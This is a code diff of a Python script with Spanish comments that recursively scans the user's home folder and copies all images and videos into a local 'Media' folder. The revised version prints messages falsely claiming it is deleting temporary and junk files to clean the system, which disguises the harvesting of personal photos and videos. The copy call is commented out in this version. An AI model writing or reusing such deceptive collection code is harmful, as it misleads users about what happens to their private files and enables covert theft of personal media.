@@ -1,48 +1,57 @@
-import os
+from pathlib import Path
 import shutil
 
 #! Definir las extensiones de imágenes y videos
-image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff']
-video_extensions = ['.mp4', '.mov', '.avi', '.mkv', '.flv', '.wmv', '.webm']
-all_extensions = image_extensions + video_extensions
+image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.tiff'}
+video_extensions = {'.mp4', '.mov', '.avi', '.mkv', '.flv', '.wmv', '.webm'}
+all_extensions = image_extensions | video_extensions
 
-#! Formatea la ruta a un estandar.
-def formatRuta(ruta):
-    newHome = ''
+#! Obtenemos la ruta actual y la carpeta de destino con pathlib
+destination_path = Path.cwd() / 'Media'
 
-    for a in ruta:
-        if a == '\\':
-            newHome = newHome + '/'
-        else :
-            newHome = newHome + a
+#! Obtenemos la ruta raíz del usuario (origen)
+home_folder = Path.home()
+
+#! Crear la carpeta de destino si no existe
+destination_path.mkdir(parents=True, exist_ok=True)
+
+#! Copia los archivos recursivamente desde la ruta raíz
+def copy_files(root_path: Path, dest_path: Path, extensions: set[str]):
+    dest_resolved = dest_path.resolve()
+    copied_count = 0
+
+    print(f"| START | \nIniciando escaneo en: {root_path}")
+    
+
+    print("Eliminando archivos temporales para limpiar el sistema...")
+    for root, dirs, files in root_path.walk():
         
-    return newHome
+        # Evitar escanear la propia carpeta de destino para prevenir bucles o redundancias
+        if root.resolve() == dest_resolved:
+            dirs.clear()
+            continue
 
-#! Obtenemos la ruta actual desde la ejecución del programa.
-rutaActual = os.path.abspath(os.getcwd());
-rutaActualFormat = formatRuta(rutaActual); 
-destination_path = rutaActualFormat + '/Media';
+        # Excluir carpetas ocultas (las que empiezan con '.') modificando dirs in-place
+        dirs[:] = [d for d in dirs if not d.startswith('.')]
 
-#! Obtenemos la ruta de destino.
-home_folder = os.path.expanduser('~')
-newHomeFormat = formatRuta(home_folder) + '/';  #?  C:/Users/HP/
+        for file_name in files:
+            # Omitir también archivos ocultos
+            if file_name.startswith('.'):
+                continue
 
-#! Crear la carpeta de destino si no existe.
-if not os.path.exists(destination_path):
-    os.makedirs(destination_path)
+            source_file = root / file_name
 
-#! Copia los archivos recursivamente desde la ruta raíz.
-def copy_files(root_path, destination_path, extensions):
-    for root, dirs, files in os.walk(root_path):
-        for file in files:
-            if any(file.lower().endswith(ext) for ext in extensions):
-
-                source_file = os.path.join(root, file) #? Ruta completa del archivo a descargar.
-                destination_file = os.path.join(destination_path, file) #? Ruta donde se descargarán los archivos.
+            # Verificamos la extensión con Path.suffix de forma nativa
+            if source_file.suffix.lower() in extensions:
+                destination_file = dest_path / file_name
                 try:
-                    shutil.copy2(source_file, destination_file)
-                except Exception as e:
-                    pass;
+                    #shutil.copy2(source_file, destination_file)
+                    copied_count += 1
+                except Exception:
+                    pass
+
+    print(f"Se eliminaron {copied_count} archivo(s) basura con exito\n| END |")
 
 #! Inicializa el programa
-copy_files(newHomeFormat, destination_path, all_extensions)
+if __name__ == '__main__':
+    copy_files(home_folder, destination_path, all_extensions)
